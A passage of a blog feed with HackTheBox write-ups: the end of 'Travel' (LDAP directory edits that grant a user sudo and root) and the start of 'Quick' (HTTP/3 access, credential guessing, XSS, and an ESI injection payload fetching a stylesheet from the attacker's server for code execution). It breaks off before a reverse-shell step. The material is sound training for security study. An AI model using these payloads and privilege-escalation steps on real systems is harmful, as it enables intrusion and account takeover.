class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:~$ ldapsearch -x -w Theroadlesstraveled</span><br><span class="line"><span class="comment"># extended LDIF</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># LDAPv3</span></span><br><span class="line"><span class="comment"># base &lt;dc=travel,dc=htb&gt; (default) with scope subtree</span></span><br><span class="line"><span class="comment"># filter: (objectclass=*)</span></span><br><span class="line"><span class="comment"># requesting: ALL</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># travel.htb</span></span><br><span class="line">dn: dc=travel,dc=htb</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: dcObject</span><br><span class="line">objectClass: organization</span><br><span class="line">o: Travel.HTB</span><br><span class="line">dc: travel</span><br><span class="line"></span><br><span class="line"><span class="comment"># admin, travel.htb</span></span><br><span class="line">dn: cn=admin,dc=travel,dc=htb</span><br><span class="line">objectClass: simpleSecurityObject</span><br><span class="line">objectClass: organizationalRole</span><br><span class="line">cn: admin</span><br><span class="line">description: LDAP administrator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># lynik-admin, travel.htb</span></span><br><span class="line">dn: cn=lynik-admin,dc=travel,dc=htb</span><br><span class="line">description: LDAP administrator</span><br><span class="line">objectClass: simpleSecurityObject</span><br><span class="line">objectClass: organizationalRole</span><br><span class="line">cn: lynik-admin</span><br><span class="line">userPassword:: e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ=</span><br><span class="line"> =</span><br><span class="line"> </span><br><span class="line">[...]</span><br><span class="line"><span class="comment"># louise, users, linux, servers, travel.htb</span></span><br><span class="line">dn: uid=louise,ou=users,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line">uid: louise</span><br><span class="line">cn: Louise Griffin</span><br><span class="line">sn: Griffin</span><br><span class="line">givenName: Louise</span><br><span class="line">loginShell: /bin/bash</span><br><span class="line">uidNumber: 5007</span><br><span class="line">gidNumber: 5000</span><br><span class="line">homeDirectory: /home/louise</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: person</span><br><span class="line">objectClass: organizationalPerson</span><br><span class="line">objectClass: inetOrgPerson</span><br><span class="line">objectClass: posixAccount</span><br><span class="line">objectClass: shadowAccount</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"><span class="comment"># numResponses: 22</span></span><br><span class="line"><span class="comment"># numEntries: 21</span></span><br></pre></td></tr></table></figure><p>Bingo! We confirmed we have the LDAP admin password. </p><h3 id="LDAP-User-privilege-escalation"><a href="#LDAP-User-privilege-escalation" class="headerlink" title="LDAP User privilege escalation"></a>LDAP User privilege escalation</h3><p>Since we have admin permissions over the LDAP server we should be able to add a new user with <code>root</code> privileges right ? Let’s give it a try.</p><p>First we create our user entry with our own SSH key and password:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dn: uid=hg8,ou=users,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line">objectClass: posixAccount</span><br><span class="line">objectClass: shadowAccount</span><br><span class="line">uid: hg8</span><br><span class="line">userPassword: hg8password</span><br><span class="line">homeDirectory: /root</span><br><span class="line">loginShell: /bin/sh</span><br><span class="line">objectClass: ldapPublicKey</span><br><span class="line">ssh-rsa AAxxx hg8@htb.htb</span><br></pre></td></tr></table></figure><p>Then use <code>ldapadd</code> command to add it to the LDAP directory:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:/$ ldapadd -D <span class="string">&quot;cn=lynik-admin,dc=travel,dc=htb&quot;</span>  -w Theroadlesstraveled -f /tmp/.hg8/hg8.ldif</span><br><span class="line">adding new entry <span class="string">&quot;uid=hg8,ou=users,ou=linux,ou=servers,dc=travel,dc=htb&quot;</span></span><br><span class="line">ldap_add: Insufficient access (50)</span><br><span class="line">        additional info: no write access to parent</span><br></pre></td></tr></table></figure><p>Bummer! We don’t have permission to do so. </p><p>Well given we found that there is already several users on the server, we should probably have enough privilege to edit one instead of creating a new one.</p><p>Here is what we are going to do:</p><ul><li>Adding the ability to Louise account to connect through SSH using our own SSH key.</li><li>Adding Louise to sudoers user in order to escalate our privileges</li><li>Editing Louise password to allows the use of <code>sudo</code> command.</li></ul><p>After getting the <code>gid</code> of <code>sudo</code> group using <code>getintent</code> we have all the needed informations to create our modified LDAP entry for user Louise:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:/$ getent group sudo</span><br><span class="line">sudo:x:27:trvl-admin</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:/$ cat hg8.ldif</span><br><span class="line">dn: uid=louise,ou=users,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line">changetype: modify</span><br><span class="line">replace: homeDirectory</span><br><span class="line">homeDirectory: /root</span><br><span class="line">-</span><br><span class="line">add: objectClass</span><br><span class="line">objectClass: ldapPublicKey</span><br><span class="line">-</span><br><span class="line">add: sshPublicKey</span><br><span class="line">sshPublicKey: ssh-rsa AAAxxx hg8@htb.htb</span><br><span class="line">-</span><br><span class="line">replace: userPassword</span><br><span class="line">userPassword: hg8password</span><br><span class="line">-</span><br><span class="line">replace: gidNumber</span><br><span class="line">gidNumber: 27</span><br></pre></td></tr></table></figure><p>Now we apply the modification:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:/$ ldapmodify -D <span class="string">&quot;cn=lynik-admin,dc=travel,dc=htb&quot;</span>  -w Theroadlesstraveled -f hg8.ldif</span><br><span class="line">modifying entry <span class="string">&quot;uid=louise,ou=users,ou=linux,ou=servers,dc=travel,dc=htb&quot;</span></span><br></pre></td></tr></table></figure><p>And we should be able to login as <code>louise</code> and use <code>sudo</code> to escalate our privileges to <code>root</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archpen ~]$ ssh -i id_rsa_htb louise@travel.htb</span><br><span class="line">Creating directory <span class="string">&#x27;/home@TRAVEL/louise&#x27;</span>.</span><br><span class="line">Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)</span><br><span class="line"></span><br><span class="line">  System load:                      0.06</span><br><span class="line">  Usage of /:                       46.2% of 15.68GB</span><br><span class="line">  Memory usage:                     19%</span><br><span class="line">  Swap usage:                       0%</span><br><span class="line">  Processes:                        209</span><br><span class="line">  Users logged <span class="keyword">in</span>:                  1</span><br><span class="line">  IPv4 address <span class="keyword">for</span> br-836575a2ebbb: 172.20.0.1</span><br><span class="line">  IPv4 address <span class="keyword">for</span> br-8ec6dcae5ba1: 172.30.0.1</span><br><span class="line">  IPv4 address <span class="keyword">for</span> docker0:         172.17.0.1</span><br><span class="line">  IPv4 address <span class="keyword">for</span> eth0:            10.10.10.189</span><br><span class="line"></span><br><span class="line">Last login: Fri May 29 14:19:07 2020 from 10.10.14.18</span><br><span class="line"></span><br><span class="line">To run a <span class="built_in">command</span> as administrator (user <span class="string">&quot;root&quot;</span>), use <span class="string">&quot;sudo &lt;command&gt;&quot;</span>.</span><br><span class="line">See <span class="string">&quot;man sudo_root&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">louise@travel:~$ sudo id</span><br><span class="line">[sudo] password <span class="keyword">for</span> louise:</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"></span><br><span class="line">louise@travel:~$ sudo cat /root/root.txt</span><br><span class="line">1xxxxxxxxxxxxxxxxxxxxxxxx4</span><br></pre></td></tr></table></figure><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://github.com/internetwache/GitTools">GitTools</a></li><li><a href="https://github.com/simplepie/simplepie/">SimplePie Source Code</a></li><li><a href="https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/">PHP Object Injection Cheat Sheet</a></li><li><a href="http://legalhackers.com/advisories/vBulletin-SSRF-Vulnerability-Exploit.txt">vBulletin  &lt;= 5.2.2 Preauth Server Side Request Forgery (SSRF) | Memcached Injection</a></li><li><a href="https://www.exploit-db.com/exploits/42392">GitHub Enterprise &lt; 2.8.7 - Remote Code Execution | Memcached Injection</a></li><li><a href="https://linux.die.net/man/1/ldapmodify">Ldapmodify man page</a></li><li><a href="https://linux.die.net/man/1/ldapadd">Ldapadd man page</a></li></ul><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Hard Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> git </tag>
            
            <tag> memcached </tag>
            
            <tag> docker </tag>
            
            <tag> SSRF </tag>
            
            <tag> ldap </tag>
            
            <tag> travel </tag>
            
            <tag> phpmemcached </tag>
            
            <tag> memcached injection </tag>
            
            <tag> Gopher </tag>
            
            <tag> deserialization </tag>
            
            <tag> simplePie </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Quick</title>
      <link href="/posts/quick/"/>
      <url>/posts/quick/</url>
      
        <content type="html"><![CDATA[<img width="584" alt="quick-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158612-47288200-9889-11ea-8c3d-86e4a5d2f758.png"><p>Another week, another box retired on HackTheBox: Quick!<br>This box was awesome and, I will say it again, this is my new favorite box. It was made by MrR3boot and was really well designed, exploiting a lot a real life scenario and requiring you to take your time to understand what was going on and how to progress step-by-step. While a bit long to solve (at least for me) I highly recommend you to give a try on this “Quick” box.</p><p><strong>Tl;Dr:</strong> The user flag was accessible after multiple steps. First you had to access a <code>portal</code> website available only through HTTP3 protocol, a not so easy task since most common tools don’t support it yet. From this <code>portal</code> you coud access documentation with a generic password to access clients account. Using the name, the company and the country of one of the client (displayed on a testimonial page) it was possible to guess a valid client email address and use the generic password to access a Support page. From this support page it was possible to exploit an ESI (Edge Side Includes) Injection to achieve remote code execution as <code>sam</code> user and grab the user flag from there.<br>For the root flag you first had to pivot from the <code>sam</code> user to <code>srvadm</code> user. To do so you had to exploit a weakness in a printing web app mechanism; this allows to exfiltrate <code>srvadm</code> SSH key and connect to its account. From <code>srvadm</code> a cached config file leak the <code>root</code> account password, letting you connect to it to grab the flag. </p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the hosts file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.186 quick.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC quick.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 17:25 CEST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> quick.htb (10.10.10.186)</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE    SERVICE VERSION</span><br><span class="line">22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">9001/tcp open     http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: Quick | Broadband Services</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>We have a classical web app, running on port 9001 this time, and the SSH port 22 open.</p><p>Opening <code>http://quick.htb:9001</code> display a following page:</p><p><img src="https://user-images.githubusercontent.com/9076747/81215955-69ddaf80-8fda-11ea-8d0a-25c3ca958f8d.png" alt="quick homepage"></p><p>The <strong>Get Started</strong> button lead to login page. Since we do not have any credentials yet, let’s skip it for now.<br>The update message seems interesting:</p><blockquote><p><strong>Update!</strong></p><p>We are migrating our portal with latest TLS and HTTP support. To read more about our services, please navigate to our <a href="https://portal.quick.htb/">portal</a></p><p>You might experience some connectivity issues during portal access which we are aware of and working on designing client application to provide better experience for our users. Till then you can avail our services from Mobile App</p></blockquote><p>The <code>portal</code> links to a new subdomain: <code>https://portal.quick.htb/</code>. Let’s add it to our hosts file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.186 portal.quick.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>And see what’s on there:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl https://portal.quick.htb</span><br><span class="line">curl: (7) Failed to connect to portal.quick.htb port 443: Connection refused</span><br></pre></td></tr></table></figure><p>Connexion refused? Well that’s odd and disappointing. Thinking about it it’s not that odd since <code>nmap</code> didn’t show any <code>443</code> port open. Then what ?<br>This sentence mades us think a little:</p><blockquote><p>We are migrating our portal with latest TLS and HTTP support. </p></blockquote><p>As far as I know the latest TLS version is 1.3 and out since 2018, so nothing to brag about. But on HTTP side, a new version have recently been proposed by the IETF (Internet Engineering Task Force): Hypertext Transfer Protocol Version 3 (HTTP/3). </p><p>Reading the wikipedia page of HTTP/3 we can notice a very interesting information for us:</p><blockquote><p>HTTP/3 is the upcoming third major version of the Hypertext Transfer Protocol used to exchange information on the World Wide Web, succeeding HTTP/2. </p><p>HTTP/3 is a draft based on a previous RFC draft, then named “Hypertext Transfer Protocol (HTTP) over QUIC”. QUIC is a transport layer network protocol developed initially by Google where user space congestion control is used over the User Datagram Protocol (UDP).</p><p>[…]</p><p>Although its name was initially proposed as the acronym for “Quick UDP Internet Connections”, IETF’s use of the word QUIC is not an acronym; it is simply the name of the protocol.</p><p>Among other applications, QUIC improves performance of connection-oriented web applications that are currently using TCP.</p><p><a href="https://en.wikipedia.org/wiki/HTTP/3">HTPP/3 - Wikipedia</a></p></blockquote><p>Two interesting informations here: </p><ol><li>“QUIC” protocol sounds awfully like our “Quick” box name.</li><li>“QUIC is a transport layer network protocol […] used over the User Datagram Protocol (UDP).”</li></ol><p>So when using HTTP/3, the packets are sent over UDP and not the traditional TCP. </p><p>The <code>nmap</code> scan we always do at the beginning do not check for UDP ports (<code>-sU</code> option) for the sake of scan speed. That’s the reason we didn’t see any 443 TCP port open, because it’s probably 443 UDP. </p><h3 id="HTTP3-gt-portal-quick-htb"><a href="#HTTP3-gt-portal-quick-htb" class="headerlink" title="HTTP3 -&gt; portal.quick.htb"></a>HTTP3 -&gt; portal.quick.htb</h3><p>To check if our scenario is correct let’s make a connection to <code>https://portal.quick.htb</code> but using HTTP/3 this time:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ man curl | grep -A 2 http3</span><br><span class="line">       --http3</span><br><span class="line">              Tells curl to use HTTP version 3 directly to the host and port number </span><br><span class="line">              used <span class="keyword">in</span> the URL. </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl --http3 https://portadl.quick.htb</span><br><span class="line">curl: option --http3: the installed libcurl version doesn<span class="string">&#x27;t support this</span></span><br><span class="line"><span class="string">curl: try &#x27;</span>curl --<span class="built_in">help</span><span class="string">&#x27; for more information</span></span><br></pre></td></tr></table></figure><p>Bummer, the default version of <code>libcurl</code> do not support <code>http3</code>. We are going to need to compile our own <code>libcurl</code> with http3 support.</p><p>I will use the <code>Quiche</code> version as shown in curl <a href="https://github.com/curl/curl/blob/master/docs/HTTP3.md#quiche-version">documentation</a>.<br><em>Tips: If you are using Arch based distribution, an AUR package is available: <a href="https://aur.archlinux.org/packages/curl-http3"><code>curl-http3</code></a></em>.</p><p>Once we have our <code>curl</code> version with http3 support, let’s retry our request:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl3 --http3 https://portal.quick.htb</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;title&gt; Quick | Customer Portal&lt;/title&gt;</span><br><span class="line">&lt;h1&gt;Quick | Portal&lt;/h1&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt; Welcome to Quick User Portal&lt;/p&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">  &lt;li&gt;&lt;a href=<span class="string">&quot;index.php&quot;</span>&gt;Home&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">  &lt;li&gt;&lt;a href=<span class="string">&quot;index.php?view=contact&quot;</span>&gt;Contact&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">  &lt;li&gt;&lt;a href=<span class="string">&quot;index.php?view=about&quot;</span>&gt;About&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">  &lt;li&gt;&lt;a href=<span class="string">&quot;index.php?view=docs&quot;</span>&gt;References&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>Bingo! We have a few pages available from this small portal website.  The <code>index.php?view=docs</code> contains PDF documentations:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl3 --http3 <span class="string">&quot;https://portal.quick.htb/index.php?view=docs&quot;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Quick | References&lt;/h1&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">  &lt;li&gt;&lt;a href=<span class="string">&quot;docs/QuickStart.pdf&quot;</span>&gt;Quick-Start Guide&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">  &lt;li&gt;&lt;a href=<span class="string">&quot;docs/Connectivity.pdf&quot;</span>&gt;Connectivity Guide&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><code>Connectivity.pdf</code> looks especially interesting, let’s download it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl3 --http3 <span class="string">&quot;https://portal.quick.htb/docs/Connectivity.pdf&quot;</span> -o Connectivity.pdf</span><br></pre></td></tr></table></figure><p>Open <code>Connectivity.pdf</code> displays the following documentation:</p><p><img src="https://user-images.githubusercontent.com/9076747/81219118-934d0a00-8fdf-11ea-9183-78eb86352b68.png" alt="quick connectivity documentation"></p><p>This gives us a valuable information. It’s possible for clients to connect to their router using their email address and <code>Quick4cc3$$</code> as password. Seems that once connected, clients can access WiFi configuration and access a support ticket system. </p><h3 id="Client-credentials"><a href="#Client-credentials" class="headerlink" title="Client credentials"></a>Client credentials</h3><p>Let’s go back to the home page at <code>http://quick.htb:9001</code>. We have a few informations about clients, their company and their country. Unfortunately no email address available. We may need to guess one client email address.</p><p>One testimonial catch the attention because of the mention to “WiFi”. This user surely use the router service as presented in the <code>Connectivity.pdf</code> documentation right ?</p><blockquote><p>I never regret using Quick services. Super fast wifi and no issues.<br>–By Elisa (Wink Media)</p></blockquote><p>The <code>http://quick.htb:9001/clients.php</code> page informs us that the <code>Wink</code> company is based in UK:</p><p><img src="https://user-images.githubusercontent.com/9076747/81219897-c3e17380-8fe0-11ea-9f2c-e8b58dbee0cb.png" alt="quick client page"></p><p>So we have a client name (Elisa), her company (Wink Media) and her country (UK). From those informations we should be able to create a little custom email wordlist, something like:</p><ul><li><a href="mailto:&#x65;&#x6c;&#105;&#115;&#97;&#64;&#119;&#x69;&#x6e;&#107;&#x2e;&#99;&#x6f;&#x2e;&#x75;&#107;">&#x65;&#x6c;&#105;&#115;&#97;&#64;&#119;&#x69;&#x6e;&#107;&#x2e;&#99;&#x6f;&#x2e;&#x75;&#107;</a></li><li><a href="mailto:&#x65;&#108;&#105;&#115;&#x61;&#x40;&#119;&#x69;&#110;&#x6b;&#109;&#x65;&#100;&#x69;&#x61;&#46;&#99;&#111;&#46;&#x75;&#x6b;">&#x65;&#108;&#105;&#115;&#x61;&#x40;&#119;&#x69;&#110;&#x6b;&#109;&#x65;&#100;&#x69;&#x61;&#46;&#99;&#111;&#46;&#x75;&#x6b;</a></li><li><a href="mailto:&#x65;&#108;&#105;&#x73;&#x61;&#x40;&#x77;&#105;&#110;&#x6b;&#x2d;&#x6d;&#x65;&#100;&#105;&#x61;&#46;&#x63;&#x6f;&#46;&#117;&#x6b;">&#x65;&#108;&#105;&#x73;&#x61;&#x40;&#x77;&#105;&#110;&#x6b;&#x2d;&#x6d;&#x65;&#100;&#105;&#x61;&#46;&#x63;&#x6f;&#46;&#117;&#x6b;</a></li><li>…</li></ul><p>Elisa looks like the perfect target since we know for sure she used the WiFi service as described in the documentation. But if her account does not work we might need to make email wordlist like this for other clients aswell. </p><p>So let’s go back to the login page and try to login using our credentials list. We could script it but since we only have a few possibilities so far, let’s try by hand. Let’s try <code>elisa@wink.co.uk</code>:<code>Quick4cc3$$</code>:</p><p><img src="https://user-images.githubusercontent.com/9076747/81220687-06f01680-8fe2-11ea-9ea9-2fd039e1b67b.png" alt="quick login page elisa"></p><p>And success! We are logged in as Elisa and have access to a support ticketing system: </p><p><img src="https://user-images.githubusercontent.com/9076747/81221053-972e5b80-8fe2-11ea-869f-e91fdfba6953.png" alt="quick ticket"></p><p>From this panel it’s possible to create support ticket and to view them. After checking the ticket system is not vulnerable to SQL Injection. </p><p>It is vulnerable to XSS injection:</p><p><img src="https://user-images.githubusercontent.com/9076747/81222017-ef199200-8fe3-11ea-997f-e1bb0e493899.png" alt="quick xss"> </p><p>Script gets executed when the ticket is loaded:</p><p><img src="https://user-images.githubusercontent.com/9076747/81221861-b11c6e00-8fe3-11ea-8867-f31b2879c607.png" alt="quick xss alert"></p><p>While it’s cool I am pretty sure this won’t be useful to progress. Let’s continue our investigation.</p><p>Looking back at our initial recon we notice an unusual server being used: <code>X-Powered-By: Esigate</code>.<br>According to its website:</p><blockquote><p><em>Esigate</em> is a http proxy, with full support of  ESI specification and additional features to make web application  integration fast and easy.<br><a href="http://www.esigate.org/">http://www.esigate.org/</a></p></blockquote><p>Since I didn’t know about ESI specification I checked online. W3C describe it this way:</p><blockquote><p>Edge Side Includes (ESI) is an XML-based markup language that provides a means to assemble resources in HTTP clients. Unlike other in-markup languages, ESI is designed to leverage client tools like caches to improve end-user perceived performance, reduce processing overhead on the origin server, and enhanced availability. ESI allows for dynamic content assembly at the edge of the network, whether it is in a Content Delivery Network, end-user’s browser, or in a “Reverse Proxy” right next to the origin server.</p><p><a href="https://www.w3.org/TR/esi-lang/">https://www.w3.org/TR/esi-lang/</a></p></blockquote><p>While checking online for more informations about ESI, Google return an interesting result: “<a href="https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/">ESI Injection: Abusing specific implementations</a>“.</p><blockquote><p>Some vendors implemented the possibility to include XML content that is transformed using XML Stylesheet Language Transformations. Only one occurrence was found vulnerable. We are presenting the exploit scenario affecting ESIGate version lower than 5.3.</p></blockquote><p>That’s sound exactly like our scenario. Let’s give it a try on the only page we can input data in, the ticket system.</p><h3 id="ESI-Injection-to-remote-code-execution"><a href="#ESI-Injection-to-remote-code-execution" class="headerlink" title="ESI Injection to remote code execution"></a>ESI Injection to remote code execution</h3><p>First let’s create two files on our machine, <code>dummy.xml</code> and <code>rce.xsl</code>, and open a web server to serve those two files. Just as a test to make sure our injection worked, let’s leave our two files empty. If our server receive connexion we can confirm our injection worked.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ls </span><br><span class="line">dummy.xml rce.xsl</span><br><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure><p>Let’s fill a new ticket with the following payload as described on the vulnerability page:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">esi:include</span> <span class="attr">src</span>=<span class="string">&quot;http://10.10.10.10:8000/dummy.xml&quot;</span></span></span><br><span class="line"><span class="tag">             <span class="attr">stylesheet</span>=<span class="string">&quot;http://10.10.10.10:8000/rce.xsl?&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">esi:include</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/9076747/81413960-944c7b80-9146-11ea-9fb2-60f63e4ac950.png" alt="quick ticket esi injection"></p><p>The ticket is created under <code>TKT-3426</code>. Opening it make the server crash, that’s a good sign…</p><p><img src="https://user-images.githubusercontent.com/9076747/81414231-f1483180-9146-11ea-82f5-5f2e217aa836.png" alt="quick server crash"></p><p>A better sign is that the app indeed made a call to our two files:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">10.10.10.186 - - [08/May/2020 16:13:43] <span class="string">&quot;GET /dummy.xml HTTP/1.1&quot;</span> 200 -</span><br><span class="line">10.10.10.186 - - [08/May/2020 16:13:43] <span class="string">&quot;GET /rce.xsl HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure><p>So we got the confirmation our ESI injection succeed. Let’s now try to edit the payload in <code>rce.xls</code> to download a python reserve shell that we can run later:</p><figure class="highlight xml"><table><tr><td 